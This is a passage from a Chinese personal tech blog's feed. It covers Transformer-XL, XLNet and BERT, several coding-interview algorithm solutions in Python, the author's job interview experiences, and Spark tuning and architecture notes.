    <content type="text"><![CDATA[​ transformer XL主要用来解决Transformer对于长文档NLP任务不够友好的问题。 原始的Transformer原始Transformer存在的缺陷： 1.算法无法建模超过固定长度的依赖关系。 2.被分割的句子通常不考虑句子边界，导致上下文碎片化 ​ 在给定无限内存和计算资源的情况下，Trnasformer为了将任意长度的上下文融入模型，可以无条件的处理整个上下文片段，但在实际情况下由于资源的限制，这显然是行不通的。 ​ 在实际使用中一种常见的近似方法为将整个语料库分割可管理大小的更短的片段(这就是多头)，只在每个片段中训练模型，忽略其他段，我们称之为原始Transformer(vanilla model)。 ​ 在评估过程中，原始Transformer模型在每个步骤消耗与训练期间相同长度的segment，但在最后一个位置只预测一次。然后，在下一步中，这个segment只向右移动一个位置，新的segment必须从头开始开始处理，虽然解决了利用较长的上下文的问题和上下文碎片化的问题，但是评估的资源消耗过大(时间、计算) Transformer XLTransformer XL优势： 可以在不破坏时间一致性的情况下学习固定长度以外的依赖 核心改进： 1.segment-level 的递归机制—&gt;解决固定长度上下文局限 2.新的位置编码 实验条件下效果对比原始transformer效果提升情况： 1.在长序列和短序列都获得更好的性能 2.在长依赖上的提升十分明显 3.在速度上比原始的Transformer快了1800倍 Segment-level的递归机制​ 在训练过程中，对上一个 segment 计算的隐藏状态序列进行修复，并在模型处理下一个新的 segment 时将其缓存为可重用的扩展上下文。种递归机制应用于整个语料库的每两个连续的 segment，它本质上是在隐藏状态中创建一个 segment-level 的递归。因此，所使用的有效上下文可以远远超出两个 segments。 ​ 该方式除了实现超长的上下文和解决碎片问题外，这种递归方案的另一个好处是显著加快了评估速度。 相对位置编码​ 如果直接使用Segment-level recurrence是行不通的，因为当我们重用前面的段时，位置编码是不一致的。例如：考虑一个具有上下文位置[0,1,2,3]的旧段。当处理一个新的段时，我们将两个段合并，得到位置[0,1,2,3,0,1,2,3]，其中每个位置id的语义在整个序列中是不连贯的。 ​ 为此Transformer XL提出一种新的相当位置编码使递归成为可能。与其他相对位置编码方案不同，我们的公式使用具有learnable transformations的固定嵌入，而不是earnable embeddings，因此在测试时更适用于较长的序列。 ​ 循环机制引入了新的挑战——原始位置编码将每个段分开处理，因此，来自不同段的表征会具有相同的位置编码。例如，第一和第二段的第一个表征将具有相同的编码，虽然它们的位置和重要性并不相同（比如第一个段中的第一个表征可能重要性低一些）。这种混淆可能会错误地影响网络。 ​ 针对此问题，论文提出了一种新的位置编码方式。这种位置编码是每个注意力模块的一部分。它不会仅在第一层之前编码位置，而且会基于表征之间的相对距离而非绝对位置进行编码。从技术上讲，它对注意力头分数（Attention Head’s Score）的计算方式不再是简单的乘法（Qi⋅Kj），而是包括四个部分： 内容权重——没有添加原始位置编码的原始分数。 相对于当前内容的位置偏差（Qi）。该项使用正弦类函数来计算表征之间的相对距离（例如 i-j），用以替代当前表征的绝对位置。 可学习的全局内容偏差——该模型添加了一个可学习的向量，用于调整其他表征内容（Kj）的重要性。 可学习的全局偏差——另一个可学习向量，仅根据表征之间的距离调整重要性（例如，最后一个词可能比前一段中的词更重要）。 https://www.tuicool.com/articles/iQjEF3Y]]></content>
  </entry>
  <entry>
    <title><![CDATA[深度学习——XLNet]]></title>
    <url>%2F2019%2F06%2F25%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94XLNet%2F</url>
    <content type="text"><![CDATA[​ 2019年6月，Google最新推出XLNet在20个任务中超越了BERT，并且在18个任务上都取得了当前最佳效果。本文主要来探究XLNet究竟在Bert的基础上做了哪些改进才完成这么大的进化呢？ Bert打开了NLP领域两阶段模式的大门 两阶段模式： ​ 1.预训练 ​ 2.FineTuning ​ XLNet引入了自回归语言模型和自编码语言模型的提法，是一个很好的思维框架 自回归语言模型Autoregressive LM​ 从左到右或从右到左的预测当前词，这种类型的LM被称为自回归语言模型。 ​ 典型模型：GPT系列、EMLo(虽然表面上看起来做了两个方向，但是本质上是分别于两个方向的自回归语言模型，然后将隐节点状态拼接到一起，来实现双向语言模型，仍是自回归语言模型) ​ 缺点：只能利用上文或者下文的信息(虽然ELMo利用了上文和瞎问的信息，但是因为只是简单地隐节点状态拼接，效果差强人意) ​ 优点：对于下游任务是文本生成NLP类(机器翻译、文本摘要)等，在实际内容生成的时候，就是从左到右的，自回归语言模型天然匹配这个过程。 自编码语言模型Autoencoder LM​ Bert通过随机Mask掉一部分单词，然后预训练过程根据上下文单词来预测这些被Mask掉的单词，这是经典的Denoising Autoencoder （DAE）思路，那些被Mask掉的单词就是在输入侧加入的所谓噪音,类似于Bert的这种训练预训练模式被称为DAE LM ​ 典型模型：Bert ​ 优点：能利用上下文的信息 ​ 缺点：1.对于文本生成类NLP任务效果不好（因为文本生成类任务本身就是单向的任务）。 ​ 2.第一个预训练阶段因为采取引入 [Mask] 标记来 Mask 掉部分单词的训练模式，而 Fine-tuning 阶段是看不到这种被强行加入的 Mask 标记的，所以两个阶段存在使用模式不一致的情形，这可能会带来一定的性能损失 ​ 3.在预训练截断，Bert假设句子中的多个单词被Mask掉的单词之间没有任何联系、条件独立，这显然是不一定成立的 XLNetBert的主要改进在下面的三个部分： 1.在自回归模型上引入了双向语言模型 2.引入了Transformer-XL的主要思路：相对位置编码以及分段RNN机制(长文档效果提升核心因素) 3.加大预训练使用的数据集 ​ XLNet主要针对Bert中第二个缺陷， 在自回归语言模型中引入双向模型​ 为解决Mask标记两阶段不一致的问题，XLNet打算采用在自回归语言模型中引入双向语言模型来进行解决。目标为看上去仍然是从左向右的输入和预测模式，但是其实内部已经引入了当前单词的下文信息。 ​ 解决方式： ​ 首先仍然采用双阶段模式，第一阶段为语言模型预训练，第二阶段为任务数据Fine-tuning。它主要改动的是第一截断——语言模型预训练截断，希望不再采用Bert那种带Mask标记的DAE LM模式，而是采用自回归语言模型，看上去是个标准的从左向右过程，Fine-tuning 当然也是这个过程，于是两个环节就统一起来。 ​ MLNet解决该问题的核心思路为：在预训练阶段，引入Permutation Language Model (时序语言模型)的训练目标。 ​ 就是说，比如包含单词 Ti 的当前输入的句子 X ，由顺序的几个单词构成，比如 x1,x2,x3,x4 四个单词顺序构成。我们假设，其中，要预测的单词 Ti 是 x3 ，位置在 Position 3 ，要想让它能够在上文 Context_before 中，也就是 Position 1 或者 Position 2 的位置看到 Position 4 的单词 x4 。 ​ 可以这么做：假设我们固定住 x3 所在位置，就是它仍然在 Position 3 ，之后随机排列组合句子中的4个单词，在随机排列组合后的各种可能里，再选择一部分作为模型预训练的输入 X 。比如随机排列组合后，抽取出 x4,x2，x3,x1 这一个排列组合作为模型的输入 X 。于是，x3 就能同时看到上文 x2 ，以及下文 x4 的内容了,这就是 XLNet 的基本思想 ​ 具体实现： ​ XLNet 采取了 Attention 掩码的机制（一个掩码矩阵），你可以理解为，当前的输入句子是 X ，要预测的单词 Ti 是第 i 个单词，前面1到 i-1 个单词，在输入部分观察，并没发生变化，该是谁还是谁。但是在 Transformer 内部，通过 Attention 掩码，从 X 的输入单词里面，也就是 Ti 的上文和下文单词中，随机选择 i-1 个，放到 Ti 的上文位置中，把其它单词的输入通过 Attention 掩码隐藏掉，于是就能够达成我们期望的目标（当然这个所谓放到 Ti 的上文位置，只是一种形象的说法，其实在内部，就是通过 Attention Mask ，把其它没有被选到的单词 Mask 掉，不让它们在预测单词 Ti 的时候发生作用，如此而已。看着就类似于把这些被选中的单词放到了上文 Context_before 的位置,论文中采用双流自注意力机制来进行具体实现 双流自注意力机制 ​ 1.内容注意力 标准的transfomer计算过程 ​ 2.Query流自注意力 这里并不是很懂 XLNet效果好的核心因素： 1.在自回归模式下引入和双向语言模型。 2.引入了Transformer-XL的主要思路：相对位置编码以及分段RNN机制(长文档效果提升核心因素) 3.加大预训练使用的数据集 XLNet和Bert对比 1.预训练过程不同 尽管看上去，XLNet在预训练机制引入的Permutation Language Model这种新的预训练目标，和Bert采用Mask标记这种方式，有很大不同。其实你深入思考一下，会发现，两者本质是类似的。区别主要在于：Bert是直接在输入端显示地通过引入Mask标记，在输入侧隐藏掉一部分单词，让这些单词在预测的时候不发挥作用，要求利用上下文中其它单词去预测某个被Mask掉的单词；而XLNet则抛弃掉输入侧的Mask标记，通过Attention Mask机制，在Transformer内部随机Mask掉一部分单词（这个被Mask掉的单词比例跟当前单词在句子中的位置有关系，位置越靠前，被Mask掉的比例越高，位置越靠后，被Mask掉的比例越低），让这些被Mask掉的单词在预测某个单词的时候不发生作用。所以，本质上两者并没什么太大的不同，只是Mask的位置，Bert更表面化一些，XLNet则把这个过程隐藏在了Transformer内部而已。这样，就可以抛掉表面的[Mask]标记，解决它所说的预训练里带有[Mask]标记导致的和Fine-tuning过程不一致的问题 2.XLNet坚持了自编码LM的从左到右的方式，因此XLNet在文本生成类任务上效果要比Bert好 3.XLNet引入了Transfomer XL的机制，因此对于长文本效果比Bert更好 XLNet在NLP各个领域中效果情况 1.对于阅读理解任务，效果有极大幅度的提升 2.长文档类任务，性能大幅度提升 3.综合型NLP任务，有所提升 4.文本分类和信息检索任务，有所提升，但幅度不大 总结：主要是长文档任务提升比较明显，其他类型的任务提升不大]]></content>
      <tags>
        <tag>面试</tag>
        <tag>NLP</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——数组中的逆序对]]></title>
    <url>%2F2019%2F06%2F23%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%80%86%E5%BA%8F%E5%AF%B9%2F</url>
    <content type="text"><![CDATA[题目：在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P%1000000007 实例: ​ 输入：1,2,3,4,5,6,7,0 ​ 输出：7 https://blog.csdn.net/lzq20115395/article/details/79554591 解法一：暴力冒泡 ​ 这种方法比较简单，但是时间复杂度为O(n^2),这里不做详细阐述 解法二：归并法 ​ 完全按照归并排序的方式来进行，只是附加上一个全局变量，来记录。 1234567891011121314151617181920212223242526272829303132333435363738394041global countcount = 0def InversePairs(data): def core(data): # write code here if len(data) &lt;= 1: return data num = int(len(data) / 2) left = core(data[:num]) right =core(data[num:]) return Merge(left, right) core(data) return count#合并各个子数组def Merge(left, right): global count l1 = len(left)-1 l2 = len(right)-1 res = [] num = 0 while l1&gt;=0 and l2&gt;=0: if left[l1]&lt;=right[l2]: res = [right[l2]]+res l2-=1 else: res = [left[l1]]+res count += l2+1 l1-=1 while l1&gt;=0: res = [left[l1]]+res l1-=1 while l2&gt;=0: res = [right[l2]]+res l2-=1 return res 解法3： ​ 先将原来数组进行排序，然后从排完序的数据中去取出最小的，他在原数组中的位置能表示有多少比他大的数在他前面，每取出一个在原数组中删除该元素，保证后面去除的元素在原数组中是最小的，这样]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——从1到n正数中1出现的个数]]></title>
    <url>%2F2019%2F06%2F23%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E4%BB%8E1%E5%88%B0n%E6%AD%A3%E6%95%B0%E4%B8%AD1%E5%87%BA%E7%8E%B0%E7%9A%84%E4%B8%AA%E6%95%B0%2F</url>
    <content type="text"><![CDATA[https://blog.csdn.net/yi_afly/article/details/52012593 题目:b求出1~13的整数中1出现的次数,并算出100~1300的整数中1出现的次数？为此他特别数了一下1~13中包含1的数字有1、10、11、12、13因此共出现6次,但是对于后面问题他就没辙了。ACMer希望你们帮帮他,并把问题更加普遍化,可以很快的求出任意非负整数区间中1出现的次数（从1 到 n 中1出现的次数）。 总结各个位上面1出现的次数，我们可以发现如下规律: 若weight为0，则1出现次数为round*base 若weight为1，则1出现次数为round*base+former+1 若weight大于1，则1出现次数为rount*base+base 12345678910111213141516171819202122def NumberOf1Between1AndN_Solution(self, n): # write code here if n&lt;1: return 0 count = 0 base = 1 #用来记录每个round中1出现的次数，weight为个位时，base为1，weight为十位时，base为10 rou = n while rou&gt;0: weight = rou%10 #知识当前最低位的值，依次获得个位数、十位数、百位数 rou//=10 #获得最低位前面的全部位，也就是round值 count+=rou*base #无论weight为任何数，当前位为1的个数都至少为rou*base #如果weight为1，那么当前位为1的个数前一位的值+1 if weight==1: count += (n%base)+1 elif weight&gt;1: count += base base*=10 return count]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——二叉搜索树转双向链表]]></title>
    <url>%2F2019%2F06%2F23%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E8%BD%AC%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[题目：输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向 设计到二叉搜索树基本上绕不过的思路就是中序遍历，这道题的思路依然是在中序遍历的基础上进行的改进 123456789101112131415161718192021class Solution: def __init__(): self.listHead = None #用来标记双向链表的起始节点 self.listtail = None #用来标记当前正在调整的节点 def Convert(pRoot): if pRoot==None: return self.Convert(pRoot.left) if self.listHead==None: self.listHead = pRoot #第一个节点时，直接将两个指针指向这两个节点 self.listTail = pRoot else: self.listTail.right = pRoot #核心：后面的节点,pRoot相当于下一个节点 ，可以从栈的角度进行想象 pRoot.left = self.listTail self.listTail = pRoot self.Convert(pRoot.right) return self.listHead]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
        <tag>剑指offer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[58同城AILab面经]]></title>
    <url>%2F2019%2F06%2F05%2F58%E5%90%8C%E5%9F%8EAILab%E9%9D%A2%E7%BB%8F%2F</url>
    <content type="text"><![CDATA[​ 这些都是一个星期面的，感觉头皮发麻。。。 叭咔科技 ​ 先写在这里，因为是交叉在里面的 ​ 一次性面了两面+hr面，整体上技术面比较水，但是有一道题目挺有意思的，记录一下。让你通过什么方法去近似求一下圆形的面积，当时我一脸蒙b，后来面试官提示说可以从概率的角度，用随机数什么的，才想出了用变长为2r的正方形去处理 ​ 这里涉及到一个列表和链表在增删时处理冲突的问题，列表可能会出现寻址问题 ​ 其中还有一个尴尬的问题是python中random.random生成的随机数是均匀分布还是正态分布？答案是均匀分布 58同城 一面 ​ 这一面面试官人很nice而且感觉专业水平很强，从我说项目开始一直问的模型问题都很深，问题面也边角广，而且注重细节，还会问一些具体模型实现上的事情，比如说transformer中的muti-self attention在编码上是如何实现的？word2vec输入一个词时是只更新一个词还是会更新全部的词？整体上感觉答的还可以就进了二面。然后让写了一道算法题，再两个无序数组中找出全部和为定值的组合，这个题我直接和他说了暴力枚举，他说你这个时间是多少？还能不能再优化一下？我说是O(n2)，他说能不能优化到O(n)？我说那就可以将第一数组先转成字典，这样可以降到O(n) 二面 ​ 二面整体来说比一面要简单一些，主要就是问项目上事情，特征、数据处理、模型效果等等，涉及到模型具体实现细节上的东西没有深问，本来以为一定会深问transformer的，然而并没有提。。。 三面 ​ 刚面完，热乎的三面，主要问的问题还是比较简单了，没有一面的难，感觉也是个技术人员，但是没有问的很深，遇到了一个和一面一样的问题，pytorch和tensorflow的区别在哪里，其他的基本上和一面一样了，讲项目、word2vec的原理、优化，正则化原理、公式，auc、roc含义是怎么来的，有一个问题没有答出来，kmeans是否一定会收敛，为什么？ good luck！ 顺利通过，在端午回家的前一天顺利上岸，happy！ 微软亚洲研究院 一面 ​ 项目介绍+算法题，去除数组中重复元素去重，写完了又加了一条，删除数组中有重复元素的数 一面面完已经过了4、5天了，还没约面试时间，一面感觉还不错，不知道为什么就凉了。。。 深信服 HR说面试时间已经约了，他说下周，但是下周已经过了三天，还会没消息 希望过完端午回去可以有机会]]></content>
      <tags>
        <tag>面经</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习——BERT]]></title>
    <url>%2F2019%2F05%2F25%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94BERT%2F</url>
    <content type="text"><![CDATA[什么是BERT？​ BERT(Bidirectional Encoder Representations from Transformer)源自论文Google2018年的论文”Pre-training of Deep bidirectional Transformers for Language Understanding“，其前身是Google在2017年推出的transormfer模型。 ​ 核心点为： 1.预训练 2.双向的编码表征 3.深度的Transformer 4.以语言模型为训练目标 BERT的两个任务​ 1.语言模型，根据词的上下文预测这个词是什么 ​ 2.下一句话预测（NSP）模型接收成对的句子作为输入，并学习预测该对中的第二个句子是否是原始文档中的后续句子 双向attention​ 在之前常见的attention结构都是单向的attention，顺序的从左到右，而借鉴Bi_LSTM和LSTM的关系，如果能将attention改为双向不是更好吗？ ​ 将attention改为双向遇到的最大问题就是深度的增加导致信息泄露问题，如下图： 解决该问题主要的解决方案有两种： 1.多层单向RNN，独立建模(ELMo)。前项后项信息不公用，分别为两个网络 2.Mask ML(BERT采用) ​ 解决的问题：多层的self-attention信息泄漏问题 ​ 随机mask语料中15%的token，然后将masked token 位置输出的最终隐层向量送入softmax，来预测masked token。 ​ 在训练过程中作者随机mask 15%的token，而不是把像cbow一样把每个词都预测一遍。最终的损失函数只计算被mask掉那个token。 ​ Mask如何做也是有技巧的，如果一直用标记[MASK]代替（在实际预测时是碰不到这个标记的）会影响模型，所以随机mask的时候10%的单词会被替代成其他单词，10%的单词不替换，剩下80%才被替换为[MASK]。] BERT整体结构Input representation​ 输入表征主要由下面三部分加和而成： ​ 1.词的向量化编码 就是常用的词向量化，例如Word2vec等或者直接embedding ​ 2.段编码 使用[CLS]、[SEP]做标记区分段，每个段用于其各自的向量Ei，属于A段的每个词都要加EA，属于B段的每个词都要加EB… 主要是为了下句话预测任务 ​ 3.位置编码 和transormer不同的是，这里的position embedding是可训练的，不再是适用固定的公式计算 Transformer Encoder​ 这里还会沿用Transformer的Encoder网络，首先是一个Multi-head self-attention，然后接一个Position-wise前馈网络，并且每个结构上都有残差连接. Losses​ Losses就是两部分，一部分是语言模型的任务的损失，一部分是上下文是否连续的损失。 ​ 语言模型的任务的损失 ​ 对于Mask ML随机选择进行mask的15%的词，是否正确做损失函数(一般为交叉熵损失函数) ​ 上下文是否连续损失 ​ 二分类的损失函数，连续/不连续 常见问题1.Bert的mask ml相对Cbow有什么相同和不同？​ 相同点：两种方式都采用了使用一个词周围词去预测其自身的模式。 ​ 不同点：1.mask ml是应用在多层的bert中，用来防止 transformer 的全局双向 self-attention所造成的信息泄露的问题；而Cbow时使用在单层的word2vec中，虽然也是双向，但并不存在该问题 ​ 2.cbow会将语料库中的每个词都预测一遍，而mask ml只会预测其中的15%的被mask掉的词 2.Bert针对以往的模型存在哪些改进？​ 1.创造性的提出了mask-ml来解决多层双向 self-attention所出现的信息泄露问题 ​ 2.position embedding采用了可训练的网络取到了余弦函数公式 3.Bert的双向体现在那里？​ Bert的双向并不是说他和transformer相比，模型结构进行了什么更改，而是transformer原始的Encoder部分在使用到语言模型时就是一种双向的结构，而本身transformer之所以不是双向的是因为他并不是每个单词的语言建模，而是一种整体的表征，因此不存在单向双向一说 4.对输入的单词序列，随机地掩盖15%的单词，然后对掩盖的单词做预测任务，预训练阶段随机用符号[MASK]替换掩盖的单词，而下游任务微调阶段并没有Mask操作，会造成预训练跟微调阶段的不匹配，如何金额绝？​ 15%随机掩盖的单词并不是都用符号[MASK]替换，掩盖单词操作进行了以下改进： ​ 80%用符号[MASK]替换：my dog is hairy -&gt; my dog is [MASK] ​ 10%用其他单词替换：my dog is hairy -&gt; my dog is apple ​ 10%不做替换操作：my dog is hairy -&gt; my dog is hairy 5.手写muti-attention&gt;&gt;&gt; 6、 elmo、GPT、bert三者之间有什么区别？（elmo vs GPT vs bert） （1）特征提取器：elmo采用LSTM进行提取，GPT和bert则采用Transformer进行提取。很多任务表明Transformer特征提取能力强于LSTM，elmo采用1层静态向量+2层LSTM，多层提取能力有限，而GPT和bert中的Transformer可采用多层，并行计算能力强。 （2）单/双向语言模型： GPT采用单向语言模型，elmo和bert采用双向语言模型。但是elmo实际上是两个单向语言模型（方向相反）的拼接，这种融合特征的能力比bert一体化融合特征方式弱。 GPT和bert都采用Transformer，Transformer是encoder-decoder结构，GPT的单向语言模型采用decoder部分，decoder的部分见到的都是不完整的句子；bert的双向语言模型则采用encoder部分，采用了完整句子。]]></content>
      <tags>
        <tag>面试</tag>
        <tag>NLP</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试——RNN和LSTM]]></title>
    <url>%2F2019%2F05%2F24%2F%E9%9D%A2%E8%AF%95%E2%80%94%E2%80%94RNN%E5%92%8CLSTM%2F</url>
    <content type="text"><![CDATA[为什么RNN会造成梯度消失和梯度爆炸，而LSTM可以防止梯度消失？对于RNN： 而对于LSTM：]]></content>
      <tags>
        <tag>算法</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——旋转数组]]></title>
    <url>%2F2019%2F05%2F24%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%2F</url>
    <content type="text"><![CDATA[旋转数组的最小数字​ 把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。 输入一个非减排序的数组的一个旋转，输出旋转数组的最小元素。 1例如:数组&#123;3,4,5,1,2&#125;为&#123;1,2,3,4,5&#125;的一个旋转，该数组的最小值为1。 NOTE：给出的所有元素都大于0，若数组大小为0，请返回0 123456789101112131415161718192021222324class Solution: def minNumberInRotateArray(self, rotateArray): # write code here if len(rotateArray) == 0: return 0 left = 0 right = len(rotateArray) - 1 def find_rotate_index(arr, left, right): if right-left &lt;= 1: return right mid = (left + right) &gt;&gt; 1 # 当左半边有序 if arr[left] &lt;= arr[mid]: return find_rotate_index(arr,mid,right) else: return find_rotate_index(arr,left,mid) min_index = find_rotate_index(rotateArray, left, right) return rotateArray[min_index]]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索二叉树删除节点]]></title>
    <url>%2F2019%2F05%2F20%2F%E6%90%9C%E7%B4%A2%E4%BA%8C%E5%8F%89%E6%A0%91%E5%88%A0%E9%99%A4%E8%8A%82%E7%82%B9%2F</url>
    <content type="text"><![CDATA[首先要找到目标数值，然后看该节点的左右子树情况， ​ 1.没有左子树，返回其右子树 ​ 2.没有右子树，返回其左子树 ​ 3.左右子树都有，查找到其右子树的最小值的节点，替换掉被删除的节点，并删除找到的最小节点 1234567891011121314151617181920class Solution(object): def deleteNode(self, root, key): """ :type root: TreeNode :type key: int :rtype: TreeNode """ if not root: return None if root.val == key: if not root.right: left = root.left return left else: right = root.right while right.left: right = right.left root.val, right.val = right.val, root.val root.left = self.deleteNode(root.left, key) root.right = self.deleteNode(root.right, key) return root]]></content>
      <tags>
        <tag>面试</tag>
        <tag>机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试常见的计算机基础知识]]></title>
    <url>%2F2019%2F05%2F20%2F%E9%9D%A2%E8%AF%95%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[1.三次握手过程以及四次挥手过程 2.进程和线程的区别 3.操作系统的页式存储是怎么样的？有什么优缺点 Time_wait和close_wait是什么。拥塞控制和流量控制。 快排]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[大数据——spark调优]]></title>
    <url>%2F2019%2F05%2F20%2F%E5%A4%A7%E6%95%B0%E6%8D%AE%E2%80%94%E2%80%94spark%E8%B0%83%E4%BC%98%2F</url>
    <content type="text"><![CDATA[Spark调优核心参数设置 num-executors 该参数一定被设置， 为当前Application生产指定个数的Executors 实际生产环境分配80个左右的Executorsexecutor-memory 与JVM OOM(内存溢出)紧密相关，很多时候甚至决定了spark运行的性能 实际生产环境下建议8GB左右 若运行在yarn上，内存占用量不超过yarn的内存资源的50%excutor-cores 决定了在Executor中能够并行执行的Task的个数 实际生产环境建议2~3个 driver-memory 作为驱动，默认是1GB 生产环境一般设置4GB spark.default.parallelism 建议至少设置100个，官方推荐是num-executors*excutor-cores的2~3倍spark.storage.memoryFraction 用于存储的比例默认占用60%，如果计算比较依赖于历史数据，则可以适当调高该参数，如果计算严重依赖于shuffle，则需要降低该比例spark.shuffle.memoryFraction 用于shuffle的内存比例，默认占用20% 如果计算严重依赖于shuffle,则需要提高该比例 spark生态的主要组件： spark core，任务调度，内存管理，错误恢复spark sql，结构化数据处理spark streaming，流式计算spark MLlib，机器学习库GraphX,图计算 spark运行模式： local模式 standalone模式，构建master+slave集群 Spark on Yarn模式 Spark on Mesos模式 宽窄依赖 1.窄依赖是1对1或1对多，宽依赖是多对1 2.窄依赖前一步map没有完全完成也可以进行下一步，在一个线程里完成不划分stage;宽依赖下一步需要依赖前一步的结果，划分stage 4.在传输上，窄依赖之间在一个stage内只需要做pipline，每个父RDD的分区只会传入到一个子RDD分区中，通常可以在一个节点内完成转换；宽依赖在stage做shuffle，需要在运行过程中将同一个父RDD的分区传入到不同的子RDD分区中，中间可能涉及多个节点之间的数据传输 3.容错上，窄依赖只需要重新计算子分区对应的负分区的RDD即可；宽依赖，在极端情况下所有负分区的RDD都要被计算 map­reduce中数据倾斜的原因?应该如何处理?如何处理spark中的数据倾斜? 原因：在物理执行期间，RDD会被分为一系列的分区，每个分区都是整个数据集的子集。当spark调度并运行任务的时候，Spark会为每一个分区中的数据创建一个任务。大部分的任务处理的数据量差不多，但是有少部分的任务处理的数据量很大，因而Spark作业会看起来运行的十分的慢，从而产生数据倾斜 处理方式： 1.使用需要进行shuffle人工指定参数并行度 2.进行数据的清洗,把发生倾斜的刨除,用单独的程序去算倾斜的key 3.join的时候使用小数据join大数据时，换用map join 尽量减少shuffle的次数 Spark分区数设置 1、分区数越多越好吗？ 不是的，分区数太多意味着任务数太多（一个partion对应一个任务），每次调度任务也是很耗时的，所以分区数太多会导致总体耗时增多。 2、分区数太少会有什么影响？ 分区数太少的话，会导致一些结点没有分配到任务；另一方面，分区数少则每个分区要处理的数据量就会增大，从而对每个结点的内存要求就会提高；还有分区数不合理，会导致数据倾斜问题。 3、合理的分区数是多少？如何设置？ 总核数=executor-cores * num-executor 一般合理的分区数设置为总核数的2~3倍 Worker、Master、Executor、Driver 4大组件 1.master和worker节点 搭建spark集群的时候我们就已经设置好了master节点和worker节点，一个集群有一个master节点和多个worker节点。 master节点常驻master守护进程，负责管理worker节点，我们从master节点提交应用。 worker节点常驻worker守护进程，与master节点通信，并且管理executor进程。 2.driver和executor进程 driver进程就是应用的main()函数并且构建sparkContext对象，当我们提交了应用之后，便会启动一个对应的driver进程，driver本身会根据我们设置的参数占有一定的资源（主要指cpu core和memory）。下面说一说driver和executor会做哪些事。 driver可以运行在master上，也可以运行worker上（根据部署模式的不同）。driver首先会向集群管理者（standalone、yarn，mesos）申请spark应用所需的资源，也就是executor，然后集群管理者会根据spark应用所设置的参数在各个worker上分配一定数量的executor，每个executor都占用一定数量的cpu和memory。在申请到应用所需的资源以后，driver就开始调度和执行我们编写的应用代码了。driver进程会将我们编写的spark应用代码拆分成多个stage，每个stage执行一部分代码片段，并为每个stage创建一批tasks，然后将这些tasks分配到各个executor中执行。 executor进程宿主在worker节点上，一个worker可以有多个executor。每个executor持有一个线程池，每个线程可以执行一个task，executor执行完task以后将结果返回给driver，每个executor执行的task都属于同一个应用。此外executor还有一个功能就是为应用程序中要求缓存的 RDD 提供内存式存储，RDD 是直接缓存在executor进程内的，因此任务可以在运行时充分利用缓存数据加速运算。 driver进程会将我们编写的spark应用代码拆分成多个stage，每个stage执行一部分代码片段，并为每个stage创建一批tasks，然后将这些tasks分配到各个executor中执行。 Spark是如何进行资源管理的？ 1）资源的管理和分配 资源的管理和分配，由Master和Worker来完成。 Master给Worker分配资源， Master时刻知道Worker的资源状况。 客户端向服务器提交作业，实际是提交给Master。 2）资源的使用 资源的使用，由Driver和Executor。程序运行时候，向Master请求资源。 Spark和mapreduce点的区别 优点： 1.最大的区别在于.spark把用到的中间数据放入内存，而mapreduce需要通过HDFS从磁盘中取数据。 2.spark算子多，mapreduce只有map和reduce两种操作 缺点： ​ spark过度依赖内存计算，如果参数设置不当，内存不够时就会因频繁GC导致线程等待 什么是RDD RDD是一个只读的分布式弹性数据集，是spark的基本抽象 主要特性： ​ 1.分布式。由多个partition组成，可能分布于多台机器，可并行计算 ​ 2.高效的容错（弹性）。通过RDD之间的依赖关系重新计算丢失的分区 ​ 3.只读。不可变 RDD在spark中的运行流程？ 创建RDD对象 sparkContext负责计算RDD之间的依赖关系，构建DAG DAGScheduler负责把DAG分解成多个stage(shuffle stage和final stage)，每个stage中包含多个task，每个task会被TAskScheduler分发给WORKER上的Executor执行 spark任务执行流程： Driver端提交任务，向Master申请资源 Master与Worker进行RPC通信，让Work启动Executor Executor启动反向注册Driver，通过Driver—Master—Worker—Executor得到Driver在哪里 Driver产生Task，提交给Executor中启动Task去真正的做计算 spark是如何容错的？ 主要采用Lineage(血统)机制来进行容错，但在某些情况下也需要使用RDD的checkpoint 对于窄依赖，只计算父RDD相关数据即可，窄依赖开销较小 对于宽依赖，需计算所有依赖的父RDD相关数据，会产生冗余计算，宽依赖开销较大。 在两种情况下，RDD需要加checkpoint 1.DAG中的Lineage过长，如果重算，开销太大 2.在宽依赖上Cheakpoint的收益更大 一个RDD的task数量是又什么决定？一个job能并行多少个任务是由什么决定的？ 